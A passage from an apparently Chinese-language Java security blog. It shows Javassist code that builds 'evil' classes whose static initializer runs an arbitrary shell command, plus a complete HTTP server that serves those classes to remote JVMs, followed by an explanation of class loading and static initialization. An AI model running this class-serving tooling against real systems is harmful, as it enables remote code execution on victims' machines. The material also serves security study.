<span class="comment">// ctClass.setSuperclass(superC);</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>也可以将恶意代码放到静态代码块中，这样就可以直接在类加载的时候触发。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">CtConstructor</span> <span class="variable">clinit</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">    clinit.setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置父类为 AbstractTranslet</span></span><br><span class="line">    <span class="comment">// CtClass superC = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);</span></span><br><span class="line">    <span class="comment">// ctClass.setSuperclass(superC);</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通常有些场景需要我们开启 HTTP 服务监听指定端口并返回恶意类：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpServer;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClassServer</span> &#123;</span><br><span class="line">    <span class="comment">// 你也可以保留固定端口：改这里即可</span></span><br><span class="line">    <span class="comment">// 运行态</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> HttpServer server;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> ExecutorService executor;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> String fixedCmd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 简单类名校验（允许 $ 方便生成内部类名）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">SIMPLE_CLASS</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;[A-Za-z_$][A-Za-z0-9_$]*&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 指定端口启动后台监听；cmd 为类初始化时要执行的命令 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">listen</span><span class="params">(<span class="type">int</span> port, String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (server != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Server is already running&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fixedCmd = cmd;</span><br><span class="line"></span><br><span class="line">        server = HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(port), <span class="number">0</span>);</span><br><span class="line">        server.createContext(<span class="string">&quot;/&quot;</span>, he -&gt; &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">            <span class="type">int</span> <span class="variable">status</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> extractClassNameFromPath(he);</span><br><span class="line">                <span class="keyword">if</span> (name == <span class="literal">null</span> || !SIMPLE_CLASS.matcher(name).matches()) &#123;</span><br><span class="line">                    <span class="type">byte</span>[] body = <span class="string">&quot;ERR: invalid class name; use /&lt;Name&gt; or /&lt;Name&gt;.class&quot;</span></span><br><span class="line">                            .getBytes(StandardCharsets.UTF_8);</span><br><span class="line">                    status = <span class="number">400</span>;</span><br><span class="line">                    he.getResponseHeaders().set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain; charset=utf-8&quot;</span>);</span><br><span class="line">                    he.sendResponseHeaders(status, body.length);</span><br><span class="line">                    <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> he.getResponseBody()) &#123; os.write(body); &#125;</span><br><span class="line">                    bytes = body.length;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">byte</span>[] clazz = buildClassBytes(name, fixedCmd);</span><br><span class="line">                bytes = clazz.length;</span><br><span class="line">                he.getResponseHeaders().set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/java-vm&quot;</span>);</span><br><span class="line">                he.getResponseHeaders().set(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-store&quot;</span>);</span><br><span class="line">                he.getResponseHeaders().set(<span class="string">&quot;Content-Disposition&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;inline; filename=\&quot;&quot;</span> + name + <span class="string">&quot;.class\&quot;&quot;</span>);</span><br><span class="line">                he.sendResponseHeaders(status, bytes);</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> he.getResponseBody()) &#123; os.write(clazz); &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="type">byte</span>[] msg = (<span class="string">&quot;ERR: &quot;</span> + e).getBytes(StandardCharsets.UTF_8);</span><br><span class="line">                status = <span class="number">500</span>;</span><br><span class="line">                he.getResponseHeaders().set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain; charset=utf-8&quot;</span>);</span><br><span class="line">                he.sendResponseHeaders(status, msg.length);</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> he.getResponseBody()) &#123; os.write(msg); &#125;</span><br><span class="line">                bytes = msg.length;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">ms</span> <span class="operator">=</span> (System.nanoTime() - t0) / <span class="number">1_000_000L</span>;</span><br><span class="line">                logAccess(he, status, bytes, ms);</span><br><span class="line">                he.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        executor = Executors.newCachedThreadPool();</span><br><span class="line">        server.setExecutor(executor);</span><br><span class="line">        server.start();</span><br><span class="line">        System.out.printf(<span class="string">&quot;[*] Listening on http://0.0.0.0:%d/&lt;Name&gt;[.class] (cmd=\&quot;%s\&quot;)%n&quot;</span>,</span><br><span class="line">                port, fixedCmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 停止服务并回收线程池 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (server == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[*] Already stopped.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            server.stop(<span class="number">0</span>); <span class="comment">// 立即停止接收新连接</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            server = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (executor != <span class="literal">null</span>) &#123;</span><br><span class="line">                executor.shutdownNow();</span><br><span class="line">                executor = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;[*] Server stopped.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ===== 工具方法 =====</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] buildClassBytes(String className, String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(className);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">clinit</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">        <span class="type">String</span> <span class="variable">safeCmd</span> <span class="operator">=</span> cmd.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>);</span><br><span class="line">        clinit.setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + safeCmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line">        <span class="comment">// 维持与原实现一致（Java 5，major=49），方便目标 JVM 兼容</span></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        ctClass.detach();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">extractClassNameFromPath</span><span class="params">(HttpExchange he)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> he.getRequestURI() != <span class="literal">null</span> ? he.getRequestURI().getPath() : <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (path == <span class="literal">null</span> || path.isEmpty() || <span class="string">&quot;/&quot;</span>.equals(path)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 去尾斜杠</span></span><br><span class="line">        <span class="keyword">while</span> (path.endsWith(<span class="string">&quot;/&quot;</span>) &amp;&amp; path.length() &gt; <span class="number">1</span>) path = path.substring(<span class="number">0</span>, path.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> path.lastIndexOf(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">last</span> <span class="operator">=</span> (idx &gt;= <span class="number">0</span>) ? path.substring(idx + <span class="number">1</span>) : path;</span><br><span class="line">        <span class="keyword">if</span> (last.isEmpty()) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (last.endsWith(<span class="string">&quot;.class&quot;</span>)) last = last.substring(<span class="number">0</span>, last.length() - <span class="number">6</span>);</span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">logAccess</span><span class="params">(HttpExchange he, <span class="type">int</span> status, <span class="type">long</span> bytes, <span class="type">long</span> ms)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">time</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss.SSS&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">        <span class="type">String</span> <span class="variable">client</span> <span class="operator">=</span> he.getRemoteAddress() != <span class="literal">null</span> ? he.getRemoteAddress().toString() : <span class="string">&quot;-&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> he.getRequestMethod();</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> he.getRequestURI() != <span class="literal">null</span> ? he.getRequestURI().toString() : <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">proto</span> <span class="operator">=</span> he.getProtocol();</span><br><span class="line">        <span class="type">String</span> <span class="variable">ua</span> <span class="operator">=</span> he.getRequestHeaders().getFirst(<span class="string">&quot;User-Agent&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> he.getRequestHeaders().getFirst(<span class="string">&quot;Referer&quot;</span>);</span><br><span class="line">        System.out.printf(<span class="string">&quot;[%s] %s \&quot;%s %s %s\&quot; %d %dB %dms UA=\&quot;%s\&quot; Ref=\&quot;%s\&quot;%n&quot;</span>,</span><br><span class="line">                time, client, method, path, proto, status, bytes, ms,</span><br><span class="line">                ua != <span class="literal">null</span> ? ua : <span class="string">&quot;-&quot;</span>, ref != <span class="literal">null</span> ? ref : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">pause</span><span class="params">()</span> &#123;</span><br><span class="line">        pause(<span class="string">&quot;Press Enter to continue...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">pause</span><span class="params">(String prompt)</span> &#123;</span><br><span class="line">        System.out.print(prompt);</span><br><span class="line">        System.out.flush();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(System.in)</span><br><span class="line">            ).readLine(); <span class="comment">// 等待用户回车</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        EvilClassServer.listen(<span class="number">9999</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        EvilClassServer.pause();</span><br><span class="line">        EvilClassServer.stop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="字节码动态修改"><a href="#字节码动态修改" class="headerlink" title="字节码动态修改"></a>字节码动态修改</h2><h2 id="获取指定类的字节码"><a href="#获取指定类的字节码" class="headerlink" title="获取指定类的字节码"></a>获取指定类的字节码</h2><h3 id="代码中获取类的字节码"><a href="#代码中获取类的字节码" class="headerlink" title="代码中获取类的字节码"></a>代码中获取类的字节码</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(Repository.lookupClass(MyClass.class).getBytes());</span><br><span class="line">System.out.println(b64);</span><br></pre></td></tr></table></figure></div>

<h3 id="获取动态生成的类的字节码"><a href="#获取动态生成的类的字节码" class="headerlink" title="获取动态生成的类的字节码"></a>获取动态生成的类的字节码</h3><h1 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h1><p>在 Java 中，类的加载是指将 <code>.class</code> 文件的字节码加载到 JVM 的内存中并进行相应的处理。类加载是 Java 程序启动的一个重要步骤，而类的初始化是确保类在第一次使用时能正常工作的一部分。</p>
<p>类的加载和初始化是通过 <strong>类加载器（ClassLoader）</strong> 来完成的，类加载器负责加载类文件，并将其转换为可以在 JVM 中使用的 <code>Class</code> 对象。</p>
<p>Java 虚拟机规范并没有指明二进制字节流要从一个 Class 文件获取，或者说根本没有指明从哪里获取、怎样获取。这种开放性使得 Java 在很多领域得到充分运用，例如：</p>
<ul>
<li><strong>从ZIP包中读取</strong>：这很常见，成为 JAR，EAR，WAR 格式的基础。</li>
<li><strong>从网络中获取</strong>：最典型的应用就是 Applet。</li>
<li><strong>运行时计算生成</strong>：最典型的是动态代理技术，在 <code>java.lang.reflect.Proxy</code> 中，就是用了 <code>ProxyGenerator.generateProxyClass</code> 来为特定接口生成形式为 <code>$Proxy</code> 的代理类的二进制字节流。</li>
<li><strong>由其他文件生成</strong>：最典型的 JSP 应用，由 JSP 文件生成对应的 Class 类。</li>
</ul>
<h2 id="类加载的过程"><a href="#类加载的过程" class="headerlink" title="类加载的过程"></a>类加载的过程</h2><p>类加载过程包括 <strong>加载（Loading）</strong>、<strong>链接（Linking）</strong> 和 <strong>初始化（Initialization）</strong> 三个阶段。</p>
<h3 id="加载（Loading）"><a href="#加载（Loading）" class="headerlink" title="加载（Loading）"></a>加载（Loading）</h3><p>加载阶段是将类的字节码从文件系统（或其他来源）读取到内存中，并且将其转换成一个 <code>Class</code> 对象的过程。此时，JVM 并不会执行类中的任何代码，仅仅是将字节码加载到内存中。加载过程包括：</p>
<ul>
<li>通过类的全限定名获从文件系统、JAR 包、网络等不同的源查找类的字节码。</li>
<li>类加载器将字节码代表的静态存储结构转化为方法区（在 Java 8 之后，“方法区” 实现变成了 <strong>元空间 Metaspace</strong>，但概念上没变）的运行时数据结构。</li>
<li>在内存中生成一个代表该类的 <code>java.lang.Class</code> 对象，作为方法区这个类的各种数据的访问入口。</li>
</ul>
<h3 id="链接（Linking）"><a href="#链接（Linking）" class="headerlink" title="链接（Linking）"></a>链接（Linking）</h3><p>在 <strong>类加载（Loading）</strong> 阶段，JVM 只是把类的字节码文件读进来，转成了内存中的运行时数据结构（<code>Class</code> 对象）。但要让这个类<strong>真正能被 JVM 正确执行</strong>，还需要对它做进一步的处理，这就是 <strong>链接（Linking）</strong> 阶段。</p>
<p><strong>链接就是把“纯字节码数据”变成“可执行的、合法的、可互操作的类”</strong> 的过程，它包括：</p>
<h4 id="验证（Verification）"><a href="#验证（Verification）" class="headerlink" title="验证（Verification）"></a>验证（Verification）</h4><p>检查<strong>类文件的字节码是否合法且符合 JVM 的规范</strong>，确保字节码不会破坏 JVM 的安全性。</p>
<h4 id="准备（Preparation）"><a href="#准备（Preparation）" class="headerlink" title="准备（Preparation）"></a>准备（Preparation）</h4><p>为类的<strong>静态变量</strong>分配内存，并将其初始化为默认值（如 0、null、false 等）。</p>
<h4 id="解析（Resolution）"><a href="#解析（Resolution）" class="headerlink" title="解析（Resolution）"></a>解析（Resolution）</h4><p>将常量池中的<strong>符号引用</strong>（如类名、方法名、字段名）替换为<strong>直接引用</strong>（即实际的内存地址）。</p>
<p>这一步是懒惰的，即 JVM 规范允许解析在初始化之后延迟进行；HotSpot 通常会在首次使用符号引用时才解析。</p>
<h3 id="初始化（Initialization）"><a href="#初始化（Initialization）" class="headerlink" title="初始化（Initialization）"></a>初始化（Initialization）</h3><h4 id="类初始化相关结构"><a href="#类初始化相关结构" class="headerlink" title="类初始化相关结构"></a>类初始化相关结构</h4><h5 id="static-变量"><a href="#static-变量" class="headerlink" title="static 变量"></a><code>static</code> 变量</h5><p><strong>类级别</strong>，与实例无关；同一 <em>ClassLoader</em> 中只有<strong>一份</strong>。在“准备”阶段先置默认值；若有显式初始化（非常量表达式），会在 <code>&lt;clinit&gt;</code> 里按<strong>源码顺序</strong>执行。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[ClassLoader #1]</span><br><span class="line">  └─ Class Demo</span><br><span class="line">       ├─ static int s   ---&gt;  [  单一存储格  ]   ← Demo.s / a.s / b.s 都指向它</span><br><span class="line">       └─ (class元数据...)</span><br><span class="line"></span><br><span class="line">  ├─ 对象 a : &#123; int x; ... &#125;   // 没有自己的 s</span><br><span class="line">  └─ 对象 b : &#123; int x; ... &#125;   // 也没有自己的 s</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong>准备（Preparation）阶段</strong>：JVM 为 <code>static</code> 字段分配存储并设<strong>默认值</strong>（数值型&#x3D;0，引用&#x3D;null，boolean&#x3D;false…）。</p>
</li>
<li><p><strong>初始化（Initialization）阶段</strong>：执行 <code>&lt;clinit&gt;</code>（由<strong>静态字段的显式赋值</strong> + <strong><code>static &#123;&#125;</code> 块</strong>按源码顺序合成），把上面的默认值更新为你写在代码里的初始值。</p>
<ul>
<li>例：<code>static int s = f();</code>、<code>static &#123; s = g(); &#125;</code> 都在 <code>&lt;clinit&gt;</code> 里执行，<strong>每个 ClassLoader 仅一次</strong>。</li>
</ul>
</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>在容器（如 Tomcat）里，不同 WebApp 的类由<strong>不同的 ClassLoader</strong>加载；<strong>每个加载器有自己的一份 static 存储</strong>。这就是热部署&#x2F;多应用下“看起来又初始化了一次”的原因。</p>

    </div>
  </div>

<h5 id="static-final-变量"><a href="#static-final-变量" class="headerlink" title="static final 变量"></a><code>static final</code> 变量</h5><p>分两类：</p>
<ul>
<li><p><strong>编译期常量（constant variable）</strong></p>
<ul>
<li>形态：<code>public static final</code> <strong>原始类型</strong>或 <strong><code>String</code><strong>，且右值是</strong>编译期常量表达式</strong>（如字面量或纯常量算式）</li>
<li><strong>不会触发初始化</strong>：其他类<strong>读取它</strong>时，通常早已<strong>内联</strong>进自己的常量池</li>
<li>在“准备”阶段就通过 <code>ConstantValue</code> 直接设为该值</li>
</ul>
</li>
<li><p><strong>非常量（运行期求值）</strong></p>
<ul>
<li>形态：<code>static final Integer X = Integer.valueOf(42);</code>、<code>static final int Y = foo();</code> 等</li>
<li>需要在 <code>&lt;clinit&gt;</code> 执行赋值；<strong>读取它会触发类初始化</strong></li>
</ul>
</li>
</ul>
<p><code>final</code> 的语义：<strong>只能赋值一次</strong>。对<strong>引用</strong>来说，引用一旦指向某对象就不能再指向别的对象，但<strong>对象内容</strong>（若本身可变）仍可变。</p>
<h5 id="静态代码块-static"><a href="#静态代码块-static" class="headerlink" title="静态代码块 static { ... }"></a>静态代码块 <code>static &#123; ... &#125;</code></h5><p>静态代码块中的代码会合并进 <code>&lt;clinit&gt;</code>，和<strong>静态字段的显式赋值</strong>一起按<strong>源码顺序</strong>执行，并且每个 <em>ClassLoader</em> <strong>只执行一次</strong>。在代码块中只能访问<strong>静态成员</strong>；不能使用 <code>this</code>，若抛出异常，<strong>初始化失败</strong>，该类在该 <em>ClassLoader</em> 下将“损坏”，后续使用会得到 <code>NoClassDefFoundError</code>。</p>
<p>没有 <code>static</code> 声明的是实例初始化块 &#x2F; 非静态初始化块（<code>&#123; ... &#125;</code>），这种代码块中的代码在<strong>每次 new</strong> 对象、在<strong>父类构造完成之后</strong>、<strong>当前类构造器体之前</strong>执行。也就是说每创建一个实例就执行一次（所有构造器都会执行它），并且在代码块中可以用 <code>this</code>，可访问实例字段&#x2F;方法。</p>
<h4 id="类初始化的操作"><a href="#类初始化的操作" class="headerlink" title="类初始化的操作"></a>类初始化的操作</h4><p>类初始化阶段的主要动作包括：</p>
<ul>
<li><p><strong>执行类中的静态代码块（<code>static &#123;&#125;</code>）</strong></p>
<ul>
<li><p>JVM 会把所有静态代码块合并到 <code>&lt;clinit&gt;</code> 方法里，保证只执行一次。执行顺序与代码在源文件中出现的顺序一致。</p>
<blockquote>
<p><code>&lt;clinit&gt;</code> 其实是 JVM 在类加载过程中 <strong>自动生成的一个特殊方法</strong>，全称是 <strong>Class Initializer</strong>（类初始化方法）。JVM 会在<strong>类初始化阶段</strong>调用该方法一次。</p>
</blockquote>
</li>
</ul>
</li>
<li><p><strong>静态变量的初始化</strong></p>
<ul>
<li>如果静态变量有显式赋值语句，就在 <code>&lt;clinit&gt;</code> 方法里执行赋值。</li>
<li>如果没有赋值，则保持在链接阶段中的准备阶段时的默认值（<code>0</code>、<code>null</code>、<code>false</code> 等）。</li>
<li>静态变量赋值和静态代码块会按源文件中的顺序依次执行。</li>
</ul>
</li>
</ul>

  <div class="note-large red">
